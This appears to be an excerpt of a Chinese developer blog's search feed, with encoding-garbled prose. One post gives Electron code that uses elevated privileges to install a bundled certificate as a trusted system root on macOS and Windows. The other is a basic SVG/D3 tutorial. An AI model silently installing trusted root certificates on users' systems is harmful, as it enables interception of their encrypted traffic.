id="å®‰è£…è¯ä¹¦æ ¸å¿ƒä»£ç "><a href="#å®‰è£…è¯ä¹¦æ ¸å¿ƒä»£ç " class="headerlink" title="å®‰è£…è¯ä¹¦æ ¸å¿ƒä»£ç "></a>å®‰è£…è¯ä¹¦æ ¸å¿ƒä»£ç </h3><p>è¯ä¹¦ç±»ï¼Œæä¾›äº†å®‰è£…è¯ä¹¦çš„åŠŸèƒ½ï¼Œå†…éƒ¨å»åˆ¤æ–­æ‰€åœ¨çš„æ“ä½œç³»ç»Ÿã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>);</span><br><span class="line"><span class="keyword">import</span> sudo <span class="keyword">from</span> <span class="string">&#x27;sudo-prompt&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; throwError &#125; <span class="keyword">from</span> <span class="string">&#x27;rxjs&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> os = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs-extra&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">InstallCer</span> </span>&#123;</span><br><span class="line">    platform = os.type().toLowerCase();</span><br><span class="line">    cerPath = path.resolve(__dirname, <span class="string">&#x27;../assets/cers&#x27;</span>, <span class="string">&#x27;cer.crt&#x27;</span>);</span><br><span class="line">    configDir = app.getPath(<span class="string">&#x27;userData&#x27;</span>);</span><br><span class="line">    assetsDir = path.resolve(<span class="built_in">this</span>.configDir, <span class="string">&#x27;assets/&#x27;</span>)</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;è¯ä¹¦è·¯å¾„ï¼š&#x27;</span>, <span class="built_in">this</span>.cerPath);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;å®ä¾‹åŒ–æˆåŠŸ,å½“å‰ç³»ç»Ÿï¼š&#x27;</span>, <span class="built_in">this</span>.platform);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;ç”¨æˆ·ç›®å½•ï¼š&#x27;</span>, <span class="built_in">this</span>.configDir);</span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        fs.ensureDirSync(<span class="built_in">this</span>.assetsDir);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fs.copySync(<span class="built_in">this</span>.cerPath, <span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.assetsDir&#125;</span>/cer.crt`</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;æ‹·è´è¯ä¹¦æˆåŠŸ&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">           <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// mac ç³»ç»Ÿå®‰è£…è¯ä¹¦</span></span><br><span class="line">    <span class="function"><span class="title">darwin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain &quot;<span class="subst">$&#123;<span class="built_in">this</span>.assetsDir&#125;</span>/cer.crt&quot;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// windows ç³»ç»Ÿå®‰è£…è¯ä¹¦</span></span><br><span class="line">    <span class="function"><span class="title">windows_nt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`certutil -addstore -f &quot;ROOT&quot; &quot;<span class="subst">$&#123;<span class="built_in">this</span>.assetsDir&#125;</span>/cer.crt&quot;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">runCer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> command = <span class="built_in">this</span>[<span class="built_in">this</span>.platform]();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">            sudo.exec(</span><br><span class="line">                command,</span><br><span class="line">                &#123;</span><br><span class="line">                  name: <span class="string">&#x27;OK Network Assistant&#x27;</span>,</span><br><span class="line">                  icns: path.resolve(__dirname, <span class="string">&#x27;../assets/&#x27;</span>, <span class="string">&#x27;icon.icns&#x27;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                        reject(error)</span><br><span class="line">                    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                        resolve(<span class="literal">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            );</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‘æ— æ•Œ"><a href="#å‘æ— æ•Œ" class="headerlink" title="å‘æ— æ•Œ"></a>å‘æ— æ•Œ</h3><h4 id="shellè¯»å–assar-èµ„æº"><a href="#shellè¯»å–assar-èµ„æº" class="headerlink" title="shellè¯»å–assar èµ„æº"></a>shellè¯»å–assar èµ„æº</h4><p>é—®é¢˜ï¼š</p><p>åœ¨è¿›è¡Œå®‰è£…æ—¶ï¼Œå‡ºç°äº†è¯»å–èµ„æºå¤±è´¥çš„é—®é¢˜ã€‚é€šè¿‡æŸ¥é˜…å®˜æ–¹æ–‡æ¡ˆï¼Œå‘ç°æ—¶assarä¸­çš„èµ„æºä¸æ”¯æŒé€šè¿‡<strong>shellç®¡é“</strong>çš„å½¢å¼è·å–èµ„æºã€‚</p><p>è§£å†³ï¼š</p><p>åœ¨è¿›è¡Œå®‰è£…æ—¶ï¼Œå…ˆå§=æŠŠèµ„æºä»<strong>assar</strong>ä¸­æ‹·è´åˆ°assarå¤–çš„ç›®å½•ä¸‹ã€‚è¿™é‡Œæˆ‘å§ç›®å½•æ”¾åœ¨äº†ç”¨æˆ·ç›®å½•ä¸‹ï¼Œé€šè¿‡ <strong>app.getPath(â€˜userDataâ€™)</strong> è¯¥æ–¹æ³•å»è·å–æ¯ä¸ªæ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ç›®å½•ã€‚</p><h4 id="å¼€å‘ä¸è¿è¡Œç¯å¢ƒå¯¹æ–‡ä»¶çš„ä¾èµ–"><a href="#å¼€å‘ä¸è¿è¡Œç¯å¢ƒå¯¹æ–‡ä»¶çš„ä¾èµ–" class="headerlink" title="å¼€å‘ä¸è¿è¡Œç¯å¢ƒå¯¹æ–‡ä»¶çš„ä¾èµ–"></a>å¼€å‘ä¸è¿è¡Œç¯å¢ƒå¯¹æ–‡ä»¶çš„ä¾èµ–</h4><p>é—®é¢˜ï¼š</p><p>ç”±äºè·¯å¾„åœ¨å¼€å‘ä¸è¿è¡Œæ—¶éƒ½æ˜¯ç›¸å¯¹çš„ä¸€ä¸ªè·¯å¾„ï¼Œæ‰€ä»¥åœ¨æ‰“åŒ…åï¼Œè¿è¡Œæ—¶æ— æ³•æ‰¾åˆ°icon\è¯ä¹¦ç­‰æ–‡ä»¶ã€‚</p><p>è§£å†³ï¼š</p><p>åœ¨å¼€å‘æ—¶æä¾›ä¸€ä»½èµ„æºç›®å½•ï¼Œç”Ÿæˆç¯å¢ƒæ‰“åŒ…çš„åœ°æ–¹å†æ¬¡æä¾›ä¸€ä»½ç›®å½•ï¼Œç›®å‰è™½ç„¶è§£å†³ã€‚ä½†æ˜¯è¿˜æ˜¯éœ€è¦å‡çº§ä¸‹è§£å†³æ–¹æ¡ˆï¼</p><h4 id="å®‰è£…è¯ä¹¦æˆåŠŸã€å¤±è´¥ã€å¼ºåˆ¶å®‰è£…æ–°è¯ä¹¦"><a href="#å®‰è£…è¯ä¹¦æˆåŠŸã€å¤±è´¥ã€å¼ºåˆ¶å®‰è£…æ–°è¯ä¹¦" class="headerlink" title="å®‰è£…è¯ä¹¦æˆåŠŸã€å¤±è´¥ã€å¼ºåˆ¶å®‰è£…æ–°è¯ä¹¦"></a>å®‰è£…è¯ä¹¦æˆåŠŸã€å¤±è´¥ã€å¼ºåˆ¶å®‰è£…æ–°è¯ä¹¦</h4><p>é—®é¢˜ï¼š<br>åœ¨å®‰è£…äº†è¯ä¹¦çš„ç”¨æˆ·ç”µè„‘ä¸Šï¼Œå¦‚æœé‡æ–°å®‰è£…æ—¶ï¼Œæ˜¯æ— æ³•è¿›è¡Œå®‰è£…çš„ã€‚</p><p>è§£å†³ï¼š<br>ä½¿ç”¨<strong>electron-store</strong>æ•°æ®é…ç½®æ¨¡å—ï¼Œå»è®°å½•è¯¥ç”µè„‘çš„æ“ä½œã€‚å¦‚æœç”¨æˆ·å®‰è£…äº†å°±ä¿å­˜value:1ï¼Œå¤±è´¥ä¸º2ã€‚ä½†æ˜¯å¦‚æœå†æ¬¡å‘å¸ƒæ–°çš„ç‰ˆæœ¬æ—¶ï¼Œå®‰è£…æˆåŠŸçš„valueå€¼å°±éœ€è¦é‡æ–°æ”¹å˜ã€‚è¯¥å€¼è®¡æ¬¡å åŠ ï¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ([<span class="literal">undefined</span>, <span class="number">2</span>, <span class="number">1</span>].includes(store.get(<span class="string">&#x27;isInstallCer&#x27;</span>))) &#123;</span><br><span class="line">      <span class="built_in">this</span>.time = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.handleSearch();</span><br><span class="line">        <span class="built_in">clearTimeout</span>(<span class="built_in">this</span>.time);</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.props.history.push(routes.COUNTER)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ï¼Œæˆ‘æŠŠæ¯æ¬¡å®‰è£…æˆåŠŸä½¿ç”¨è¿‡çš„å€¼éƒ½æ”¾å…¥**[undefined, 2, 1]**è¿™é‡Œã€‚ä½¿å¾—æ¯æ¬¡å‘å¸ƒçš„æ–°ç‰ˆæœ¬ã€‚ç”¨æˆ·åœ¨ä½¿ç”¨æ—¶å¯ä»¥å®‰è£…åˆ°å¿ƒå¾—è¯ä¹¦ï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> electron </tag>
            
            <tag> react </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D3 æ•°æ®å¯è§†åŒ–</title>
      <link href="posts/751f2370/"/>
      <url>posts/751f2370/</url>
      
        <content type="html"><![CDATA[<h3 id="èµ„æº"><a href="#èµ„æº" class="headerlink" title="èµ„æº"></a>èµ„æº</h3><h4 id="ä»£ç ï¼šhttps-github-com-1160007652-react-d3"><a href="#ä»£ç ï¼šhttps-github-com-1160007652-react-d3" class="headerlink" title="ä»£ç ï¼šhttps://github.com/1160007652/react-d3"></a>ä»£ç ï¼š<a href="https://github.com/1160007652/react-d3">https://github.com/1160007652/react-d3</a></h4><h4 id="Demoï¼šhttps-1160007652-github-io-react-d3"><a href="#Demoï¼šhttps-1160007652-github-io-react-d3" class="headerlink" title="Demoï¼šhttps://1160007652.github.io/react-d3"></a>Demoï¼š<a href="https://1160007652.github.io/react-d3">https://1160007652.github.io/react-d3</a></h4><hr><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>D3 (æˆ–è€…å« D3.js )æ˜¯ä¸€ä¸ªåŸºäº web æ ‡å‡†çš„ JavaScript å¯è§†åŒ–åº“. D3 å¯ä»¥å€ŸåŠ© SVG, Canvas ä»¥åŠ HTML å°†ä½ çš„æ•°æ®ç”ŸåŠ¨çš„å±•ç°å‡ºæ¥. D3 ç»“åˆäº†å¼ºå¤§çš„å¯è§†åŒ–äº¤äº’æŠ€æœ¯ä»¥åŠæ•°æ®é©±åŠ¨ DOM çš„æŠ€æœ¯ç»“åˆèµ·æ¥, è®©ä½ å¯ä»¥å€ŸåŠ©äºç°ä»£æµè§ˆå™¨çš„å¼ºå¤§åŠŸèƒ½è‡ªç”±çš„å¯¹æ•°æ®è¿›è¡Œå¯è§†åŒ–.</p><a id="more"></a><h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h3><p>SVG æ˜¯ä½¿ç”¨ XML æ¥æè¿°äºŒç»´å›¾å½¢å’Œç»˜å›¾ç¨‹åºçš„è¯­è¨€ã€‚</p><h3 id="svg-é€Ÿå­¦"><a href="#svg-é€Ÿå­¦" class="headerlink" title="svg é€Ÿå­¦"></a>svg é€Ÿå­¦</h3><h4 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h4><blockquote><p>rect çŸ©å‹ \ circle åœ† \ ellipse æ¤­åœ† \ line ç›´çº¿ \ polygon å¤šè¾¹å½¢ \ polyline æ›²çº¿ \ path è·¯å¾„\ text æ–‡å­—</p></blockquote><h4 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><h5 id="å…±æœ‰å±æ€§"><a href="#å…±æœ‰å±æ€§" class="headerlink" title="å…±æœ‰å±æ€§"></a>å…±æœ‰å±æ€§</h5><blockquote><p>stroke æè¾¹é¢œè‰² \ stroke-width æè¾¹å®½åº¦<br>stroke-linecap çº¿æ¡ä¸¤ç«¯çš„æ ·å¼ : butt ç›´è§’åŸçŠ¶æ€ \ round åœ†è§’çŠ¶æ€ \ square åŠ é•¿æ–¹è§’çŠ¶æ€<br>stroke-dasharray èš‚èšçº¿<br>stroke-opacity æè¾¹é€æ˜åº¦ [ 0 - 1 ]</p></blockquote><blockquote><p>fill å¡«å……é¢œè‰²<br>fill-opacity å¡«å……é€æ˜åº¦ [ 0 - 1 ]</p></blockquote><blockquote><p>css-opacity æ•´ä¸ªå…ƒç´ çš„é€æ˜åº¦ [ 0 - 1 ]</p></blockquote><h5 id="rect-å±æ€§"><a href="#rect-å±æ€§" class="headerlink" title="rect å±æ€§"></a>rect å±æ€§</h5><blockquote><p>x y : èµ·å§‹ç‚¹ä½ç½®<br>rx ry : å¯ä½¿çŸ©å½¢äº§ç”Ÿåœ†è§’<br>width : å®½å¸¦<br>height: é«˜åº¦</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">&quot;50&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;20&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;20&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:red;stroke:black;stroke-width:5;opacity:0.5&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="circle-å±æ€§"><a href="#circle-å±æ€§" class="headerlink" title="circle å±æ€§"></a>circle å±æ€§</h5><blockquote><p>cx cy : åœ†å½¢çš„ä½ç½®<br>r : åŠå¾„</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ellipse-å±æ€§"><a href="#ellipse-å±æ€§" class="headerlink" title="ellipse å±æ€§"></a>ellipse å±æ€§</h5><blockquote><p>cx cy : æ¤­åœ†çš„ä½ç½®<br>rx ry : æ°´å¹³åŠå¾„ å‚ç›´åŠå¾„</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">cx</span>=<span class="string">&quot;300&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;80&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;50&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:yellow;stroke:purple;stroke-width:2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="line-å±æ€§"><a href="#line-å±æ€§" class="headerlink" title="line å±æ€§"></a>line å±æ€§</h5><blockquote><p>x1 y1 : èµ·å§‹åæ ‡<br>x2 y2 : ç»“æŸåæ ‡</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">line</span> <span class="attr">x1</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y1</span>=<span class="string">&quot;0&quot;</span> <span class="attr">x2</span>=<span class="string">&quot;200&quot;</span> <span class="attr">y2</span>=<span class="string">&quot;200&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;stroke:rgb(255,0,0);stroke-width:2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="polygon-å±æ€§"><a href="#polygon-å±æ€§" class="headerlink" title="polygon å±æ€§"></a>polygon å±æ€§</h5><blockquote><p>points : ç½®å…¥åæ ‡ç‚¹</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">polygon</span> <span class="attr">points</span>=<span class="string">&quot;220,10 300,210 170,250 123,234&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:lime;stroke:purple;stroke-width:1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="polyline-å±æ€§"><a href="#polyline-å±æ€§" class="headerlink" title="polyline å±æ€§"></a>polyline å±æ€§</h5><blockquote><p>points : ç½®å…¥åæ ‡ç‚¹</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">&quot;20,20 40,25 60,40 80,120 120,140 200,180&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:none;stroke:black;stroke-width:3&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="path-å±æ€§"><a href="#path-å±æ€§" class="headerlink" title="path å±æ€§"></a>path å±æ€§</h5><p>è·¯å¾„è§„åˆ™ï¼š<br>M = moveto(M X,Y) ï¼šå°†ç”»ç¬”ç§»åŠ¨åˆ°æŒ‡å®šçš„åæ ‡ä½ç½®<br>L = lineto(L X,Y) ï¼šç”»ç›´çº¿åˆ°æŒ‡å®šçš„åæ ‡ä½ç½®<br>H = horizontal lineto(H X)ï¼šç”»æ°´å¹³çº¿åˆ°æŒ‡å®šçš„Xåæ ‡ä½ç½®<br>V = vertical lineto(V Y)ï¼šç”»å‚ç›´çº¿åˆ°æŒ‡å®šçš„Yåæ ‡ä½ç½®<br>C = curveto(C X1,Y1,X2,Y2,ENDX,ENDY)ï¼šä¸‰æ¬¡è´èµ›æ›²çº¿<br>S = smooth curveto(S X2,Y2,ENDX,ENDY)<br>Q = quadratic Belzier curve(Q X,Y,ENDX,ENDY)ï¼šäºŒæ¬¡è´èµ›æ›²çº¿<br>T = smooth quadratic Belzier curveto(T ENDX,ENDY)ï¼šæ˜ å°„<br>A = elliptical Arc(A RX,RY,XROTATION,FLAG1,FLAG2,X,Y)ï¼šå¼§çº¿<br>Z = closepath()ï¼šå…³é—­è·¯å¾„</p><blockquote><p>d : å­˜æ”¾è·¯å¾„è§„åˆ™</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M150 0 L75 200 L225 200 Z&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="text-å±æ€§"><a href="#text-å±æ€§" class="headerlink" title="text å±æ€§"></a>text å±æ€§</h5><p>1ã€ç›´æ¥å†™å‡ºæ–‡å­—</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span>I love SVG<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2ã€è·¯å¾„å†™æ–‡å­—</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">defs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">path</span> <span class="attr">id</span>=<span class="string">&quot;path1&quot;</span> <span class="attr">d</span>=<span class="string">&quot;M75,20 a1,1 0 0,0 100,0&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">defs</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:red;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textPath</span> <span class="attr">xlink:href</span>=<span class="string">&quot;#path1&quot;</span>&gt;</span>I love SVG I love SVG<span class="tag">&lt;/<span class="name">textPath</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3ã€å¤šè¡Œæ–‡æœ¬</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:red;&quot;</span>&gt;</span>Several lines:</span><br><span class="line">    <span class="tag">&lt;<span class="name">tspan</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;45&quot;</span>&gt;</span>First line<span class="tag">&lt;/<span class="name">tspan</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tspan</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;70&quot;</span>&gt;</span>Second line<span class="tag">&lt;/<span class="name">tspan</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 